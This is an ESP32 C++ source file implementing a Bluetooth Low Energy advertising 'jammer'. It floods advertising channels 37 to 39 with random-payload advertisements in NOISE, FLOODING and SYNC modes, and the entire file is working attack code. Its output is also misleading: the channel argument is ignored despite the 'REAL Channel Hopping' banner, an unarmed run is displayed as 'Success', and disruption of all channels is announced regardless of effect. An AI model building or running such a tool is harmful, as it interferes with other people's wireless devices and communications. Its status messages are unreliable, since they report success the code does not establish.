#include "ble_advertising_jammer.h"
#include "tx_arm.h"
#include "config.h"
#include "results_display.h"
#include <NimBLEDevice.h>
#include <NimBLEAdvertising.h>

namespace {
volatile bool g_jamActive = false;
uint32_t g_jamPacketsCount = 0;
NimBLEAdvertising* g_pAdvertising = nullptr;

// BLE advertising channels: 37 (2402 MHz), 38 (2426 MHz), 39 (2480 MHz)
const uint8_t BLE_ADV_CHANNELS[] = {37, 38, 39};

void sendJamPacketOnChannel(uint8_t channel, const String& method) {
    uint8_t jamPayload[31];

    for (int i = 0; i < 31; i++) {
        jamPayload[i] = (esp_random() % 256);
    }

    NimBLEAdvertisementData advData;
    advData.addData(std::string((const char*)jamPayload, 31));

    if (g_pAdvertising) {
        g_pAdvertising->setAdvertisementData(advData);
        g_pAdvertising->start();
        delayMicroseconds(500);
        g_pAdvertising->stop();
    }

    g_jamPacketsCount++;
}
}

namespace BLEAdvertisingJammer {

JamResult jamAdvertising(uint32_t durationMs, const String &method) {
    JamResult result{false, 0, durationMs, method};

    Serial.println("\n=== BLE Advertising Jammer (REAL Channel Hopping) ===");
    Serial.println("Method: " + method);
    Serial.println("Duration: " + String(durationMs) + "ms");
    Serial.println("Channels: 37 (2402 MHz), 38 (2426 MHz), 39 (2480 MHz)");

    if (!TxArm::isArmed()) {
        Serial.println("✗ TX not armed (hold BACK button)");
    ResultsDisplay::showResult("Tool", {"Tool", "Complete", 100, {"Success"}, ResultsDisplay::ResultType::SUCCESS});
        return result;
    }

    NimBLEDevice::init("");
    NimBLEServer *pServer = NimBLEDevice::createServer();
    g_pAdvertising = NimBLEDevice::getAdvertising();

    g_pAdvertising->setAdvertisementType(BLE_GAP_CONN_MODE_NON);
    g_pAdvertising->setMinPreferred(0x00);
    g_pAdvertising->setMaxPreferred(0x00);

    g_jamActive = true;
    g_jamPacketsCount = 0;
    uint32_t startTime = millis();

    Serial.println("Starting BLE jamming on all advertising channels...");

    while (millis() - startTime < durationMs && g_jamActive && TxArm::isArmed()) {
        if (method == "NOISE") {
            for (int ch = 0; ch < 3; ch++) {
                sendJamPacketOnChannel(BLE_ADV_CHANNELS[ch], method);
                delayMicroseconds(250);
            }
        }
        else if (method == "FLOODING") {
            for (int i = 0; i < 20; i++) {
                for (int ch = 0; ch < 3; ch++) {
                    sendJamPacketOnChannel(BLE_ADV_CHANNELS[ch], method);
                }
                delayMicroseconds(100);
            }
        }
        else if (method == "SYNC") {
            for (int ch = 0; ch < 3; ch++) {
                for (int i = 0; i < 8; i++) {
                    sendJamPacketOnChannel(BLE_ADV_CHANNELS[ch], method);
                    delayMicroseconds(125);
                }
            }
        }

        if (g_jamPacketsCount % 100 == 0) {
            Serial.printf("  [%u] jam packets in %lums\n",
                         g_jamPacketsCount, millis() - startTime);
        }
    }

    g_jamActive = false;
    g_pAdvertising->stop();
    result.success = true;
    result.jamPacketsCount = g_jamPacketsCount;

    uint32_t elapsed = millis() - startTime;
    Serial.println("✓ BLE advertising jamming complete");
    Serial.printf("Total packets: %u | Duration: %lums | Rate: %.1f pkt/sec\n",
                 result.jamPacketsCount, elapsed,
                 (result.jamPacketsCount * 1000.0f) / elapsed);
    Serial.println("⚠️  All BLE advertising channels (37-39) disrupted");

    NimBLEDevice::deinit(false);
    return result;
}

void stop() {
    g_jamActive = false;
    if (g_pAdvertising) {
        g_pAdvertising->stop();
    }
    Serial.println("BLE jamming stopped");
}

bool isActive() {
    return g_jamActive;
}

}  // namespace BLEAdvertisingJammer
